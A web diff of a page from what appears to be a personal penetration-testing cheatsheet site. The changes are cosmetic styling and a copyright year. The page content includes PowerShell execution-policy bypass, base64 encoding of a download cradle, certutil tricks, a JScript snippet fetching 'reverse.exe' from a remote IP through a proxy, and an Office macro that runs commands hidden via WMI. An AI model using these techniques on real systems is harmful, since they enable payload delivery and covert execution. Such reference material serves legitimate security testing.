@@ -39,25 +39,25 @@
 </a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/sshuttle/>sshuttle</a></div></details><details><summary>Privilege Escalation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/linux/>Linux
 </a><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/windows/>Windows</a></div></details><details><summary>Reverse Shells</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/bash/>Bash
 </a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/metasploit/>Metasploit
-</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/php/>PHP</a></div></details></div></details><hr style="border:none;border-top:1px solid rgba(255,255,255,3%);margin:12px 0"><div style=padding:8px;color:#9aa4b2;font-size:13px>I wuv cheese :D</div></nav><main><header class=page-title><h1>Misc</h1></header><article><h1 id=enable-execution-of-powershell-scripts>Enable execution of PowerShell Scripts</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>Set-ExecutionPolicy RemoteSigned
+</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/php/>PHP</a></div></details></div></details><hr style="border:none;border-top:1px solid rgba(255,255,255,3%);margin:12px 0"><div style=padding:8px;color:#9aa4b2;font-size:13px>I wuv cheese :D</div></nav><main><header class=page-title><h1>Misc</h1></header><article><h1 id=enable-execution-of-powershell-scripts>Enable execution of PowerShell Scripts</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-console data-lang=console><span style=display:flex><span>Set-ExecutionPolicy RemoteSigned
 </span></span><span style=display:flex><span>Set-ExecutionPolicy Unrestricted
 </span></span><span style=display:flex><span>powershell.exe -exec bypass
-</span></span></code></pre></div><hr><h1 id=encode-powershell-b64-from-linux>Encode Powershell b64 from Linux</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>echo &#39;ImAnEviCradleBuuhhhh&#39; | iconv -t UTF-16LE | base64 -w0
-</span></span></code></pre></div><hr><h1 id=encodedecode-b64-in-windows-without-powershell>Encode/Decode b64 in Windows WITHOUT Powershell</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>certutil -encode &lt;inputfile&gt; &lt;outputfile&gt;
+</span></span></code></pre></div><hr><h1 id=encode-powershell-b64-from-linux>Encode Powershell b64 from Linux</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-console data-lang=console><span style=display:flex><span>echo &#39;ImAnEviCradleBuuhhhh&#39; | iconv -t UTF-16LE | base64 -w0
+</span></span></code></pre></div><hr><h1 id=encodedecode-b64-in-windows-without-powershell>Encode/Decode b64 in Windows WITHOUT Powershell</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-console data-lang=console><span style=display:flex><span>certutil -encode &lt;inputfile&gt; &lt;outputfile&gt;
 </span></span><span style=display:flex><span>certutil -decode &lt;b64inputfile&gt; &lt;plainoutputdecodedfile&gt;
 </span></span><span style=display:flex><span>  ^-- If the file exists I can use the -f flag which will force an overwrite
-</span></span></code></pre></div><hr><h1 id=set-proxy-in-code-used-windows>Set Proxy in code used (Windows)</h1><h2 id=powershell>Powershell</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>[System.Net.WebRequest]::DefaultWebProxy.GetProxy(url)
-</span></span></code></pre></div><h2 id=jscript>JScript</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>var url = &#34;http://192.168.42.43/reverse.exe&#34;;
+</span></span></code></pre></div><hr><h1 id=set-proxy-in-code-used-windows>Set Proxy in code used (Windows)</h1><h2 id=powershell>Powershell</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-console data-lang=console><span style=display:flex><span>[System.Net.WebRequest]::DefaultWebProxy.GetProxy(url)
+</span></span></code></pre></div><h2 id=jscript>JScript</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-console data-lang=console><span style=display:flex><span>var url = &#34;http://192.168.42.43/reverse.exe&#34;;
 </span></span><span style=display:flex><span>var var Object = new ActiveXObject(&#34;MSXML2.ServerXMLHTTP.6.0&#34;);
 </span></span><span style=display:flex><span>Object.setProxy(&#34;2&#34;,&#34;192.168.42.42:3128&#34;);
 </span></span><span style=display:flex><span>Object.open(&#39;GET&#39;, url, false);
 </span></span><span style=display:flex><span>Object.send();
 </span></span><span style=display:flex><span>  ^-- This was tricky because lack of debug information. The parameter in &#34;2&#34; means &#34;SXH_PROXY_SET_PROXY&#34;, and it allows to specify a list of one or more servers together with a bypass list. The .open() must be in lowercase otherwise .Open() is another method
-</span></span></code></pre></div><hr><h1 id=hide-foreground-with-wmi-windows-office-macros>Hide Foreground with WMI (Windows, Office Macros)</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>Sub example()
+</span></span></code></pre></div><hr><h1 id=hide-foreground-with-wmi-windows-office-macros>Hide Foreground with WMI (Windows, Office Macros)</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-console data-lang=console><span style=display:flex><span>Sub example()
 </span></span><span style=display:flex><span>  Const HIDDEN_WINDOW = 0
 </span></span><span style=display:flex><span>  Dim cmd As String
 </span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
-</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  cmd = &#34;Here there is some commands to execute inside the macro via WMI&#34;
+</span></span></span><span style=display:flex><span>  cmd = &#34;Here there is some commands to execute inside the macro via WMI&#34;
 </span></span><span style=display:flex><span>  Set objWMIService = GetObject(&#34;winmgmts:&#34;)
 </span></span><span style=display:flex><span>  Set objStartup = objWMIService.Get(&#34;Win32_ProcessStartup&#34;)
 </span></span><span style=display:flex><span>  Set objConfig = objStartup.SpawnInstance_
@@ -69,7 +69,7 @@
 |
 <a href=https://youtube.com/c/LeandroLemos target=_blank>YouTube</a>
 |
-<a href=https://twitch.tv/0xc350 target=_blank>Twitch</a></p><p class=copyright>Copyright © 2025
+<a href=https://twitch.tv/0xc350 target=_blank>Twitch</a></p><p class=copyright>Copyright © 2026
 <a href=https://ceso.github.io/><strong>Ceso</strong></a>.</p><p class=builtWith>Built with
 <a href=http://www.gohugo.io/>Hugo</a> by ceso,
 using <a href=https://github.com/ceso/smigle-lagom>smigle-lagom</a> a fork of the theme
